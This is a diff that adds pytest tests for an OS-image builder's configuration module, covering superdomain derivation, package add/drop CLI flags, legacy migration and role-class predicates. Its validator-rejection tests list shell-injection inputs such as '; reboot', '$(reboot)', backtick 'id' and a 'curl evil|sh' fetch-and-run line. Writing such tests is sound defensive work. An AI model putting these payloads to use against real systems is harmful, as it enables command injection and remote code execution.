@@ -10,14 +10,17 @@ import pytest
 
 from snapdragon_studio.core.config import (
     BUILDER_SCRIPTS,
+    DESKTOP_ROLES,
     ENV_CHOICES,
     GPU_DRIVER_ALIASES,
     GPU_DRIVER_CHOICES,
+    HOME_DESKTOP_FIELDS,
     Domain,
     ImageConfig,
     INFRA_SERVICES_CHOICES,
     MODE_DEFAULT_ROLE,
     MODE_SKIPPED_PAGES,
+    NODE_ROLES,
     NON_ARGV_FIELDS,
     OPTIONAL_SERVICES_BY_PLATFORM,
     PLATFORM_FIELD_SUPPORT,
@@ -25,9 +28,19 @@ from snapdragon_studio.core.config import (
     SECRET_FIELDS,
     SERVICES_ALL,
     SERVICES_NONE,
+    THEME_FIELDS,
     UNAFFILIATED_ROLE,
     User,
     WIZARD_PAGE_SLUGS,
+    X86_CLIENT_ROLES,
+    X86_NODE_ROLES,
+    branding_allowed,
+    clear_role_class_fields,
+    enter_mesh_defaults,
+    home_options_allowed,
+    image_class,
+    strip_platform_unsupported,
+    tailnet_sso_visible,
 )
 
 
@@ -76,8 +89,10 @@ def test_mode_skipped_pages_match_the_page_catalog():
     assert set(MODE_SKIPPED_PAGES) == set(MODE_DEFAULT_ROLE)
     for slugs in MODE_SKIPPED_PAGES.values():
         assert set(slugs) <= set(WIZARD_PAGE_SLUGS)
-    assert MODE_SKIPPED_PAGES["standalone"] == ("keyzip", "domains", "users")
-    for structural in ("welcome", "mode", "role", "build"):
+    assert MODE_SKIPPED_PAGES["standalone"] == ("worklist", "keyzip", "domains", "users")
+    # 'role' is no longer universally structural — mesh skips it (the WorklistPage owns
+    # role x platform there); welcome/mode/build stay structural in every mode.
+    for structural in ("welcome", "mode", "build"):
         assert all(structural not in slugs for slugs in MODE_SKIPPED_PAGES.values())
 
 
@@ -1142,10 +1157,18 @@ def test_g2_g40_g41_never_argv():
 
 
 def test_non_argv_fields_set():
-    assert set(NON_ARGV_FIELDS) == {"headscale_url", "pentest", "hw_profile"}
+    # superdomain stays out-of-band (v1 = manifest + KEYS channel, zero emission).
+    # packages_add/packages_drop STARTED here (WS-CORE Phase 1) but WS-BUILDER flipped
+    # them to emitted --packages-add/--packages-drop, so they are NO LONGER here — they
+    # now live in PLATFORM_FIELD_SUPPORT (all six platforms).
+    assert set(NON_ARGV_FIELDS) == {"headscale_url", "pentest", "hw_profile", "superdomain"}
     # and none of them appear in the capability table (they are not "silently dropped")
     for f in NON_ARGV_FIELDS:
         assert f not in PLATFORM_FIELD_SUPPORT
+    # extra_packages + the now-emitted packages_add/packages_drop are DIFFERENT,
+    # emitted fields — all three must be in the table, none in the out-of-band set.
+    for f in ("extra_packages", "packages_add", "packages_drop"):
+        assert f in PLATFORM_FIELD_SUPPORT and f not in NON_ARGV_FIELDS
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -1244,6 +1267,8 @@ _FIELD_PROBE = {
     "distdir": {"distdir": "/tmp/dist"}, "build_subdir": {"build_subdir": "sub"},
     "seed_url": {"seed_url": "http://s/x"}, "version": {"version": "1.2.3"},
     "release_tag": {"release_tag": "rc1"}, "extra_packages": {"extra_packages": "app-editors/vim"},
+    "packages_add": {"packages_add": "app-editors/vim"},
+    "packages_drop": {"packages_drop": "app-editors/vim"},
 }
 
 
@@ -1285,3 +1310,310 @@ def test_capability_table_platforms_are_all_known():
     for field, plats in PLATFORM_FIELD_SUPPORT.items():
         for p in plats:
             assert p in BUILDER_SCRIPTS, f"{field} references unknown platform {p}"
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# WS-CORE redesign: superdomain, packages_add/drop, Domain.images + games migration,
+# the load() envelope guard, and the role-class capability layer (§2.1/§2.2/§2.6).
+# All Qt-free, all NON_ARGV — the argv byte-identity is proven by the goldens above.
+# ═══════════════════════════════════════════════════════════════════════════════
+
+# ---- superdomain: field + derivation + round-trip + manifest --------------------
+
+def test_superdomain_derivation_and_explicit():
+    # "" derives <brand>.internal; an explicit value wins
+    assert ImageConfig().effective_superdomain() == "snapdragon.internal"
+    assert ImageConfig(brand="acme").effective_superdomain() == "acme.internal"
+    assert ImageConfig(brand="acme", superdomain="mesh.acme.internal"
+                       ).effective_superdomain() == "mesh.acme.internal"
+
+
+def test_superdomain_never_reaches_argv():
+    # superdomain is NON_ARGV (v1 = manifest + KEYS channel) — no builder flag on any platform
+    for kw in (dict(mode="mesh", role="omnibus", platform="x86", tailscale=True, sso=True),
+               dict(mode="mesh", role="be", platform="rpi5", tailscale=True)):
+        args = ImageConfig(superdomain="acme.internal", **kw).to_cli_args()
+        for tok in ("--superdomain", "acme.internal", "--super-domain"):
+            assert tok not in args
+
+
+def test_superdomain_round_trip_and_manifest(tmp_path):
+    cfg = ImageConfig(mode="mesh", role="omnibus", platform="x86", brand="acme",
+                      superdomain="core.acme.internal")
+    p = tmp_path / "c.json"
+    cfg.save(str(p))
+    r = ImageConfig.load(str(p))
+    assert r.superdomain == "core.acme.internal"
+    assert r.effective_superdomain() == "core.acme.internal"
+    # the manifest carries the effective superdomain (derived when "")
+    assert cfg.mesh_manifest()["superdomain"] == "core.acme.internal"
+    assert ImageConfig(brand="acme").mesh_manifest()["superdomain"] == "acme.internal"
+
+
+def test_superdomain_internal_suffix_accepted_by_validate_identity():
+    # .internal must validate — the whole v1 depends on <brand>.internal being legal
+    ImageConfig(mode="mesh", role="omnibus", platform="x86",
+                superdomain="snapdragon.internal").to_cli_args()   # must not raise
+
+
+def test_superdomain_injection_rejected():
+    with pytest.raises(ValueError):
+        ImageConfig(superdomain="x;reboot.internal").to_cli_args()
+
+
+# ---- packages_add / packages_drop: EMITTED flags + round-trip + atom regex -----
+
+def test_packages_add_drop_reach_argv():
+    # WS-BUILDER Phase 2: packages_add/packages_drop now emit --packages-add /
+    # --packages-drop as one argv element each (space-separated atom string), on
+    # EVERY platform (all six builders parse them identically).
+    for plat, extra in (("x86", dict(mode="mesh", role="omnibus", tailscale=True, sso=True)),
+                        ("rpi5", dict(mode="mesh", role="be", tailscale=True)),
+                        ("frite", dict(mode="cloud", role="frite")),
+                        ("jetson", dict(mode="mesh", role="edge_ai")),
+                        ("orangepi5", dict(mode="cloud", role="orangepi5")),
+                        ("orangepizero2", dict(mode="cloud", role="orangepizero2"))):
+        args = ImageConfig(platform=plat, packages_add="app-editors/vim app-misc/tmux",
+                           packages_drop="games-util/steam", **extra).to_cli_args()
+        assert ("--packages-add", "app-editors/vim app-misc/tmux") in pairs(args)
+        assert ("--packages-drop", "games-util/steam") in pairs(args)
+
+
+def test_packages_add_drop_empty_emit_nothing():
+    # byte-identity (I1): defaults ("") emit NEITHER flag on any platform, so every
+    # existing flat config's argv is unchanged by the flip.
+    for plat, extra in (("x86", dict(mode="mesh", role="omnibus", tailscale=True, sso=True)),
+                        ("rpi5", dict(mode="mesh", role="be", tailscale=True))):
+        args = ImageConfig(platform=plat, **extra).to_cli_args()
+        assert "--packages-add" not in args and "--packages-drop" not in args
+
+
+def test_packages_add_drop_round_trip(tmp_path):
+    cfg = ImageConfig(mode="mesh", role="be", platform="rpi5",
+                      packages_add="app-editors/vim dev-vcs/git",
+                      packages_drop="games-util/steam")
+    p = tmp_path / "c.json"
+    cfg.save(str(p))
+    r = ImageConfig.load(str(p))
+    assert r.packages_add == "app-editors/vim dev-vcs/git"
+    assert r.packages_drop == "games-util/steam"
+
+
+@pytest.mark.parametrize("atoms", [
+    "",                                   # empty = no packages
+    "app-editors/vim",
+    "app-editors/vim app-misc/tmux dev-vcs/git",
+    "sys-fs/ecryptfs-utils sys-apps/keyutils",
+    "dev-libs/libFoo",                    # package name may carry caps
+    "virtual/foo x11-libs/gtk+3",         # '+' is legal in an atom
+    "cat.d/pkg_1.2",                      # '.' and '_' legal
+])
+def test_validate_package_atoms_accepts(atoms):
+    ImageConfig(packages_add=atoms, packages_drop=atoms).to_cli_args()   # must not raise
+
+
+@pytest.mark.parametrize("bad", [
+    "vim",                                # no category/name slash
+    "app-editors/vim; reboot",            # shell metacharacter
+    "app-editors/vim && curl evil|sh",
+    "$(reboot)/x",
+    "app-editors/",                       # empty package name
+    "/vim",                               # empty category
+    "app editors/vim",                    # space inside an atom (would split into 'app' + 'editors/vim')
+    "App-Editors/vim",                    # uppercase category not allowed
+    "app-editors/vim`id`",
+])
+def test_validate_package_atoms_rejects(bad):
+    with pytest.raises(ValueError):
+        ImageConfig(packages_add=bad).to_cli_args()
+    with pytest.raises(ValueError):
+        ImageConfig(packages_drop=bad).to_cli_args()
+
+
+def test_extra_packages_kept_frozen_and_separate_from_packages_add():
+    # extra_packages STILL emits --extra-packages on ARM (frozen, unchanged);
+    # packages_add is now a SEPARATE emitted flag (--packages-add), never merged.
+    args = ImageConfig(mode="mesh", role="be", platform="rpi5", tailscale=True,
+                       extra_packages="app-editors/vim",
+                       packages_add="app-misc/tmux").to_cli_args()
+    assert ("--extra-packages", "app-editors/vim") in pairs(args)
+    assert ("--packages-add", "app-misc/tmux") in pairs(args)
+    # two distinct flags, not concatenated into one
+    assert "--extra-packages" in args and "--packages-add" in args
+
+
+# ---- Domain.images round-trip + legacy games -> optional_services migration ------
+
+def test_domain_images_round_trip(tmp_path):
+    cfg = ImageConfig(mode="mesh", role="omnibus", platform="x86",
+                      domains=[Domain(name="a.example", title="A",
+                                      images=["omnibus.x86", "be.rpi5"]),
+                               Domain(name="b.example")])
+    p = tmp_path / "c.json"
+    cfg.save(str(p))
+    r = ImageConfig.load(str(p))
+    assert r.domains[0].images == ["omnibus.x86", "be.rpi5"]
+    assert r.domains[1].images == []
+
+
+def test_domain_has_no_games_field():
+    assert "games" not in Domain.__dataclass_fields__
+    assert "images" in Domain.__dataclass_fields__
+    with pytest.raises(TypeError):
+        Domain(name="x", games=True)     # the field is gone
+
+
+def test_legacy_domain_games_migrates_to_optional_services():
+    # a legacy save with games:true -> optional_services gains "games" (never dropped)
+    cfg = ImageConfig.from_dict({"mode": "mesh", "role": "omnibus",
+                                 "domains": [{"name": "a.example", "games": True,
+                                              "optional_services": ["akkoma"]}]})
+    assert cfg.domains[0].optional_services == ["akkoma", "games"]
+    assert not hasattr(cfg.domains[0], "games")
+
+
+def test_legacy_domain_games_no_duplicate_and_false_ignored():
+    # games:true already listed -> no duplicate; games:false -> no-op
+    dup = ImageConfig.from_dict({"domains": [{"name": "a", "games": True,
+                                              "optional_services": ["games", "tube"]}]})
+    assert dup.domains[0].optional_services == ["games", "tube"]
+    off = ImageConfig.from_dict({"domains": [{"name": "b", "games": False}]})
+    assert off.domains[0].optional_services == []
+
+
+def test_domain_games_migration_is_load_level(tmp_path):
+    # an old on-disk save with the games key still loads and migrates
+    p = tmp_path / "old.json"
+    p.write_text(json.dumps({"mode": "mesh", "role": "omnibus",
+                             "domains": [{"name": "a.example", "games": True}]}),
+                 encoding="utf-8")
+    cfg = ImageConfig.load(str(p))
+    assert cfg.domains[0].optional_services == ["games"]
+
+
+# ---- ImageConfig.load() envelope guard ------------------------------------------
+
+def test_load_rejects_worklist_envelope(tmp_path):
+    p = tmp_path / "wl.json"
+    p.write_text(json.dumps({"schema": "snapdragon-worklist/v1",
+                             "base": ImageConfig().to_dict(), "entries": []}),
+                 encoding="utf-8")
+    with pytest.raises(ValueError, match="worklist envelope"):
+        ImageConfig.load(str(p))
+
+
+def test_load_still_accepts_flat_config(tmp_path):
+    # a flat config (no schema key) loads byte-identically — the 118 harness configs + saves
+    p = tmp_path / "flat.json"
+    ImageConfig(mode="cloud", role="desktop", platform="x86").save(str(p))
+    cfg = ImageConfig.load(str(p))
+    assert cfg.role == "desktop" and cfg.mode == "cloud"
+
+
+# ---- role-class capability layer (§2.2) -----------------------------------------
+
+def test_image_class_desktop_vs_node():
+    # desktop-class person/standalone/ARM-desktop roles
+    for role in ("laptop", "chromebook", "desktop", "standalone-thin", "standalone-thick",
+                 "standalone-unaffiliated", "rpi5-desktop", "jetson-desktop", "frite",
+                 "orangepi5"):
+        assert image_class("cloud", role) == "desktop", role
+    # node-class cluster infra + headless appliances
+    for role in ("pki", "be", "fe", "be+gpu", "omnibus", "edge_ai", "full", "gpu-host",
+                 "orangepizero2", "generic"):
+        assert image_class("mesh", role) == "node", role
+    # membership sets are disjoint and cover the mesh/x86 catalogs
+    assert set(DESKTOP_ROLES).isdisjoint(NODE_ROLES)
+    assert set(X86_NODE_ROLES) <= set(NODE_ROLES)
+    assert set(X86_CLIENT_ROLES) <= set(DESKTOP_ROLES)
+
+
+def test_branding_allowed_predicate():
+    # desktop, non-mesh -> allowed
+    assert branding_allowed(ImageConfig(mode="standalone", role="standalone-thick"))
+    assert branding_allowed(ImageConfig(mode="cloud", role="desktop"))
+    # node role -> never
+    assert not branding_allowed(ImageConfig(mode="cloud", role="omnibus"))
+    # mesh -> never, even for a desktop-class row
+    assert not branding_allowed(ImageConfig(mode="mesh", role="rpi5-desktop"))
+
+
+def test_tailnet_sso_visible_predicate():
+    # cloud branded desktop -> visible
+    assert tailnet_sso_visible(ImageConfig(mode="cloud", role="desktop"))
+    # standalone / mesh -> hidden (implicit / none)
+    assert not tailnet_sso_visible(ImageConfig(mode="standalone", role="standalone-thick"))
+    assert not tailnet_sso_visible(ImageConfig(mode="mesh", role="omnibus"))
+    # unaffiliated hard-conflicts with the tailnet -> hidden even in cloud
+    assert not tailnet_sso_visible(ImageConfig(mode="cloud", role="standalone-unaffiliated"))
+    # a node in cloud -> hidden
+    assert not tailnet_sso_visible(ImageConfig(mode="cloud", role="edge_ai"))
+
+
+def test_home_options_allowed_predicate():
+    assert home_options_allowed(ImageConfig(mode="standalone", role="standalone-thick"))
+    assert home_options_allowed(ImageConfig(mode="cloud", role="laptop"))
+    assert not home_options_allowed(ImageConfig(mode="mesh", role="omnibus"))
+    assert not home_options_allowed(ImageConfig(mode="cloud", role="pki"))
+
+
+def test_clear_role_class_fields_desktop_keeps_everything():
+    # a standalone desktop keeps theming + home; tailscale/sso already False (cleared, no-op)
+    cfg = ImageConfig(mode="standalone", role="standalone-thick", theme="boogiepop",
+                      home_mode="adopt", home_encrypted=True)
+    cleared = clear_role_class_fields(cfg)
+    assert cfg.theme == "boogiepop" and cfg.home_mode == "adopt" and cfg.home_encrypted
+    assert "theme" not in cleared and "home_mode" not in cleared
+
+
+def test_clear_role_class_fields_node_zeroes_theme_and_home():
+    cfg = ImageConfig(mode="mesh", role="omnibus", theme="boogiepop", accent_color="#123456",
+                      brand_locked=True, home_mode="adopt", home_encrypted=True,
+                      seed_packages_from="/x", tailscale=True, sso=True)
+    cleared = clear_role_class_fields(cfg)
+    # every THEME_FIELD/HOME_DESKTOP_FIELD reset to its dataclass default
+    assert cfg.theme == "" and cfg.accent_color == "" and cfg.brand_locked is False
+    assert cfg.home_mode == "create" and cfg.home_encrypted is False and cfg.seed_packages_from == ""
+    # mesh isn't a cloud desktop -> tailnet/sso reset to their tri-state default ""
+    # (#307 made them tri-states; "" = resolve-by-mode, re-forced True for mesh by enter_mesh_defaults)
+    assert cfg.tailscale == "" and cfg.sso == ""
+    for f in ("theme", "accent_color", "brand_locked", "home_mode", "tailscale", "sso"):
+        assert f in cleared
+
+
+def test_enter_mesh_defaults_clears_then_forces_tailnet():
+    cfg = ImageConfig(mode="mesh", role="omnibus", theme="boogiepop", home_mode="adopt")
+    enter_mesh_defaults(cfg)
+    assert cfg.theme == "" and cfg.home_mode == "create"
+    # today's mesh x86 argv (--with-tailscale/--with-sso) is preserved byte-identically
+    assert cfg.tailscale is True and cfg.sso is True
+    args = cfg.to_cli_args()
+    assert "--with-tailscale" in args and "--with-sso" in args
+
+
+def test_enter_mesh_defaults_preserves_mesh_x86_golden():
+    # the enter-mesh path must land on the exact existing mesh x86 golden argv
+    cfg = ImageConfig(mode="mesh", role="omnibus", platform="x86")
+    enter_mesh_defaults(cfg)
+    assert cfg.to_cli_args() == ["--role", "omnibus", "--env", "test", "--local-user", "magus",
+                                 "--with-tailscale", "--with-sso", *X86_TAIL]
+
+
+def test_strip_platform_unsupported_clears_x86_only_fields_on_arm():
+    # theme/home/secure_boot are x86-only -> stripped on an rpi5 node cfg
+    cfg = ImageConfig(mode="mesh", role="be", platform="rpi5", tailscale=True,
+                      theme="boogiepop", secure_boot="off", home_mode="adopt",
+                      brand="acme")
+    cleared = strip_platform_unsupported(cfg)
+    assert cfg.theme == "" and cfg.secure_boot == "" and cfg.home_mode == "create"
+    assert "theme" in cleared and "secure_boot" in cleared
+    # a field the rpi5 builder DOES take (brand) survives
+    assert cfg.brand == "acme" and "brand" not in cleared
+
+
+def test_strip_platform_unsupported_noop_on_x86_baseline():
+    # a plain x86 config touches no x86-supported field -> nothing spurious cleared
+    cfg = ImageConfig(mode="cloud", role="desktop", platform="x86", theme="boogiepop")
+    cleared = strip_platform_unsupported(cfg)
+    assert cfg.theme == "boogiepop"        # theme IS x86-supported
+    assert "theme" not in cleared
